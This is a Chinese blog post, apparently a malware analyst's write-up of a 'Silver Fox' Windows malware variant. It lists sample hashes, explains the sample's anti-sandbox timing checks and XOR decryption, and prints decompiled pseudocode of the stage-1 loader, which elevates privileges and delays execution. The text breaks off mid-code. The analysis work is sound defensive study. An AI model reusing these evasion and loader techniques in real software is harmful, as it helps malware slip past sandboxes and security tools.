<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="记一次完整的”银狐”样本变种分析分析方法参考了 纯干货 | &#34;银狐&#34;变种: 技术分析揭穿病毒多层混淆虚拟化伪装-技术文章-火绒安全 但是最终分析结果包括C2不相同。 元数据   SHA256 hash: 0bf6a698901d87c9af2dc08824b7dc9dcdd285fb09de5a119e72da94ace5f121    SHA3-384 hash: 9694f">
<meta property="og:type" content="article">
<meta property="og:title" content="记一次完整的银狐样本变种分析">
<meta property="og:url" content="https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/index.html">
<meta property="og:site_name" content="wooo~ Exploooosion&#39;s blog">
<meta property="og:description" content="记一次完整的”银狐”样本变种分析分析方法参考了 纯干货 | &#34;银狐&#34;变种: 技术分析揭穿病毒多层混淆虚拟化伪装-技术文章-火绒安全 但是最终分析结果包括C2不相同。 元数据   SHA256 hash: 0bf6a698901d87c9af2dc08824b7dc9dcdd285fb09de5a119e72da94ace5f121    SHA3-384 hash: 9694f">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771218632015.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771229388712.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771229859290.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771229988868.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771231910169.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771231924278.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771218336664.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771218450357.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1770958486281.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1770958439611.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1770959720026.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771236541050.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771239139750.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771239354154.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771240744653.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771240050581.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771240431244.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771240805954.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771246358711.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771246550892.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771246580994.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771246718037.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771248184315.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771310520891.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771310950970.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771311183932.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771313290602.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771336865152.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771495252218.png">
<meta property="og:image" content="https://file+.vscode-resource.vscode-cdn.net/c%3A/1/Desktop/%E7%AC%94%E8%AE%B0/MyBlog/my-blog/source/_posts/image/2026-02-12-malware_analysis_2/1771388412805.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771337787124.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771337862645.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771393390954.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771396829002.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771396865570.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771396984143.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771338721724.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771400177498.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771402532553.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771402548869.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771405720723.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771407848768.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771473137258.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771486279034.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771491917983.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771592904016.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771593210174.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771593452447.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771593562791.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771596278743.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771594933551.png">
<meta property="og:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771595081877.png">
<meta property="article:published_time" content="2026-02-11T16:00:00.000Z">
<meta property="article:modified_time" content="2026-02-20T14:10:09.121Z">
<meta property="article:author" content="Exploooosion">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://exploo0osion.github.io/image/2026-02-12-malware_analysis_2/1771218632015.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>记一次完整的银狐样本变种分析</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 8.1.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/friends/">friends</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2026/02/10/2026-02-10-learning_windows_7/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&text=记一次完整的银狐样本变种分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&title=记一次完整的银狐样本变种分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&is_video=false&description=记一次完整的银狐样本变种分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=记一次完整的银狐样本变种分析&body=Check out this article: https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&title=记一次完整的银狐样本变种分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&title=记一次完整的银狐样本变种分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&title=记一次完整的银狐样本变种分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&title=记一次完整的银狐样本变种分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&name=记一次完整的银狐样本变种分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://exploo0osion.github.io/2026/02/12/2026-02-12-malware_analysis_2/&t=记一次完整的银狐样本变种分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84%E2%80%9D%E9%93%B6%E7%8B%90%E2%80%9D%E6%A0%B7%E6%9C%AC%E5%8F%98%E7%A7%8D%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">记一次完整的”银狐”样本变种分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%83%E6%95%B0%E6%8D%AE"><span class="toc-number">1.1.</span> <span class="toc-text">元数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">分析过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-0"><span class="toc-number">1.2.1.</span> <span class="toc-text">stage 0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">stage 1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%9D%83%E9%99%90%E5%B9%B6%E5%B0%9D%E8%AF%95%E9%80%9A%E8%BF%87%E5%BC%B9%E7%AA%97%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">查询权限并尝试通过弹窗提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%8D%E6%B2%99%E7%AE%B1"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">反分析与反沙箱</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%A3%80%E6%9F%A5"><span class="toc-number">1.2.2.2.1.</span> <span class="toc-text">时间检查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95"><span class="toc-number">1.2.2.2.2.</span> <span class="toc-text">内存压力测试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#API%E7%89%B9%E5%BE%81%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.2.2.3.</span> <span class="toc-text">API特征探测</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%B5%8B%E8%AF%95"><span class="toc-number">1.2.2.2.4.</span> <span class="toc-text">其他测试</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%E6%A0%B7%E6%9C%AC"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">解密第二阶段样本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-2"><span class="toc-number">1.2.3.</span> <span class="toc-text">stage 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-3"><span class="toc-number">1.2.4.</span> <span class="toc-text">stage 3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%88%86%E6%9E%90%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">反分析初始化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E6%A3%80%E6%9F%A5"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">内存检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E6%B2%99%E7%AE%B1%E6%A3%80%E6%9F%A5"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">反沙箱检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MakeVirus%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.4.4.</span> <span class="toc-text">MakeVirus流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E5%AF%B9%E6%8A%97"><span class="toc-number">1.2.4.4.1.</span> <span class="toc-text">安全软件对抗</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0"><span class="toc-number">1.2.4.4.2.</span> <span class="toc-text">文件落地</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E4%B8%8E%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">1.2.4.4.3.</span> <span class="toc-text">运行与持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.2.4.4.3.1.</span> <span class="toc-text">创建计划任务</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A0%E9%BB%91%E5%90%8D%E5%8D%95%E8%BF%9B%E7%A8%8B%E6%97%B6%E7%9A%84%E5%88%86%E6%94%AF%E8%B7%AF%E5%BE%84"><span class="toc-number">1.2.4.4.4.</span> <span class="toc-text">无黑名单进程时的分支路径</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E7%99%BD%E5%90%8D%E5%8D%95%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.4.4.4.1.</span> <span class="toc-text">添加白名单目录</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-1"><span class="toc-number">1.2.4.4.4.2.</span> <span class="toc-text">创建计划任务</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-4"><span class="toc-number">1.2.5.</span> <span class="toc-text">stage 4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DLL%E4%BE%A7%E8%BD%BD%EF%BC%88%E7%99%BD-%E9%BB%91%EF%BC%89"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">DLL侧载（白+黑）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vdi-ipc%E8%BD%BD%E8%8D%B7"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">vdi_ipc载荷</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E7%BA%A7%E5%B9%B2%E6%8E%89%E6%9D%80%E8%BD%AF"><span class="toc-number">1.2.5.2.1.</span> <span class="toc-text">内核级干掉杀软</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.2.5.2.2.</span> <span class="toc-text">远程文件读取</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-5"><span class="toc-number">1.2.6.</span> <span class="toc-text">stage 5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage6"><span class="toc-number">1.2.7.</span> <span class="toc-text">stage6</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DLL%E4%BE%A7%E8%BD%BD%EF%BC%88%E7%99%BD-%E9%BB%91%EF%BC%89-1"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">DLL侧载（白+黑）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%AEshellcode"><span class="toc-number">1.2.7.2.</span> <span class="toc-text">内置shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84dll%E8%BD%BD%E8%8D%B7"><span class="toc-number">1.2.7.3.</span> <span class="toc-text">反射dll载荷</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage-7"><span class="toc-number">1.2.8.</span> <span class="toc-text">stage 7</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#C-C%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.8.1.</span> <span class="toc-text">C&amp;C信息</span></a></li></ol></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        记一次完整的银狐样本变种分析
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Exploooosion</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2026-02-11T16:00:00.000Z" class="dt-published" itemprop="datePublished">2026-02-12</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/malware/">malware</a> › <a class="category-link" href="/categories/malware/windows/">windows</a>
    </div>


      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <span id="more"></span>

<h1 id="记一次完整的”银狐”样本变种分析"><a href="#记一次完整的”银狐”样本变种分析" class="headerlink" title="记一次完整的”银狐”样本变种分析"></a>记一次完整的”银狐”样本变种分析</h1><p>分析方法参考了 <a target="_blank" rel="noopener" href="https://huorong.cn/document/tech/vir_report/1846">纯干货 | &#34;银狐&#34;变种: 技术分析揭穿病毒多层混淆虚拟化伪装-技术文章-火绒安全</a> 但是最终分析结果包括C2不相同。</p>
<h2 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h2><table>
<thead>
<tr>
<th align="left">SHA256 hash:</th>
<th align="left">0bf6a698901d87c9af2dc08824b7dc9dcdd285fb09de5a119e72da94ace5f121</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SHA3-384 hash:</td>
<td align="left">9694f6b59439bb4ca976280a2e80f1e3c588e5e19ac31f594cfa309cf8c0188f886749b647b4808fc114e631668b130b</td>
</tr>
<tr>
<td align="left">SHA1 hash:</td>
<td align="left">ff39258b4082985668ee47cb7877eb1be60cd8e6</td>
</tr>
<tr>
<td align="left">MD5 hash:</td>
<td align="left">4aef9e5853e3bffe0afa8a64a6fa43e7</td>
</tr>
</tbody></table>
<p>一个未签名的exe程序。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771218632015.png" alt="1771218632015"></p>
<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="stage-0"><a href="#stage-0" class="headerlink" title="stage 0"></a>stage 0</h3><p>沙箱检查</p>
<p>rdtsc计算前后时间差，fldpi 加载圆周率 PI 到浮点寄存器栈；frndint对浮点数取整。（沙箱或模拟器进行浮点运算可能会很耗时耗资源）</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771229388712.png" alt="1771229388712"></p>
<p>巨量计数器的递减循环，消耗cpu时间</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771229859290.png" alt="1771229859290"></p>
<p>这里也有一个递减循环来消耗时间的。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771229988868.png" alt="1771229988868"></p>
<p><code>0xBB8</code> (十六进制) &#x3D; 3000 (十进制)，该函数相当于等待了3000ms</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771231910169.png" alt="1771231910169"></p>
<p>直接读取 Windows 内核映射到用户空间的共享数据页（KUSER_SHARED_DATA）来获取系统启动时间，等同于GetTickCount()</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771231924278.png" alt="1771231924278"></p>
<ul>
<li><code>7FFE0004h</code>: <code>KUSER_SHARED_DATA.TickCountMultiplier</code></li>
<li><code>7FFE0320h</code>: <code>KUSER_SHARED_DATA.TickCount.LowPart</code></li>
<li><code>7FFE0324h</code>: <code>KUSER_SHARED_DATA.TickCount.High1Time</code></li>
</ul>
<p>以上这些检查过后会分配可执行内存将.data段上的数据拷贝进去执行</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771218336664.png" alt="1771218336664"></p>
<p>.data段上的指令如下：</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771218450357.png" alt="1771218450357"></p>
<p><img src="/image/2026-02-12-malware_analysis_2/1770958486281.png" alt="1770958486281"></p>
<p>使用x64dbg调试，发现一处循环异或解密的操作，下条件断点(rcx&#x3D;&#x3D;0x1)</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1770958439611.png" alt="1770958439611"></p>
<p>解密完后jmp到，大概率已经解密完成了。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1770959720026.png" alt="1770959720026"></p>
<p>dump出来第一阶段的shellcode，利用IDA MCP进行一键分析。</p>
<h3 id="stage-1"><a href="#stage-1" class="headerlink" title="stage 1"></a>stage 1</h3><p>经过MCP还原后的伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">stage1_loader_entry</span><span class="params">(_BYTE *a1, __int64 a2, __int64 a3, __int64 a4, <span class="type">int</span> a5, <span class="type">int</span> a6)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">strcpy</span>(kernel32_name, <span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(sleep_name, <span class="string">&quot;Sleep&quot;</span>);</span><br><span class="line">  pSleep = (<span class="type">void</span> (__fastcall *)(_BYTE *, __int64, __int64, __int64))resolve_api_via_hash_bridge(</span><br><span class="line">                                                                      (__int64)a1,</span><br><span class="line">                                                                      a2,</span><br><span class="line">                                                                      (__int64)sleep_name,</span><br><span class="line">                                                                      (__int64)kernel32_name,</span><br><span class="line">                                                                      a5,</span><br><span class="line">                                                                      a6);</span><br><span class="line">  ensure_elevation_via_shell_runas(a1, a2, v6, v7, v8, v9);</span><br><span class="line">  <span class="keyword">while</span> ( timing_sleep_integrity_check((__int64)a1, a2, v10, <span class="number">0x2710u</span>, v11, v12) )</span><br><span class="line">    pSleep(a1, a2, v13, <span class="number">1000LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( ntdelay_loop_i = <span class="number">0LL</span>; ntdelay_loop_i &lt; <span class="number">0x14</span>; ++ntdelay_loop_i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ntdelay_loop_i == <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(ntdll_name, <span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">      pNtDelayExecution = (__int64 (__fastcall *)(_BYTE *, __int64, __int64 *, _QWORD))resolve_api_via_hash_bridge(</span><br><span class="line">                                                                                         (__int64)a1,</span><br><span class="line">                                                                                         a2,</span><br><span class="line">                                                                                         (__int64)<span class="string">&quot;NtDelayExecution&quot;</span>,</span><br><span class="line">                                                                                         (__int64)ntdll_name,</span><br><span class="line">                                                                                         v14,</span><br><span class="line">                                                                                         v15);</span><br><span class="line">      delay_interval_100ns = <span 